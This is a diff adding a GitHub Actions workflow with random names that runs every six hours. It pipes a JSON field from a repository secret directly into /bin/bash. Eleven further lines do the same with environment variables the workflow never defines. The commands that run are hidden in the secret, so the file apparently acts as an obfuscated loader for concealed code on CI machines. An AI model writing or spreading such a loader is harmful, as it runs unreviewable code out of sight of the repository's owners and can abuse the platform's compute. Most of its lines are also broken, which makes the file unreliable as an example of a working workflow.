@@ -1,0 +1,27 @@
+name: xucijiu4819
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xucijiu4819
+        env:
+          j6237: ${{ secrets.j6237 }}
+        run: |
+          echo $j6237 | jq -r .ad8 | /bin/bash
+          echo $wvl1 | jq -r .f58 | /bin/bash
+          echo $b6861 | jq -r .izkny229 | /bin/bash
+          echo $bav0 | jq -r .wtk419 | /bin/bash
+          echo $f4 | jq -r .ukan3056 | /bin/bash
+          echo $cmw4 | jq -r .vnk58 | /bin/bash
+          echo $g9619 | jq -r .eoa65323 | /bin/bash
+          echo $qzlkm639 | jq -r .skd68 | /bin/bash
+          echo $o44 | jq -r .lftay0 | /bin/bash
+          echo $i95 | jq -r .kk26581 | /bin/bash
+          echo $eccyf874 | jq -r .q0 | /bin/bash
+          echo $h471 | jq -r .za862 | /bin/bash
+
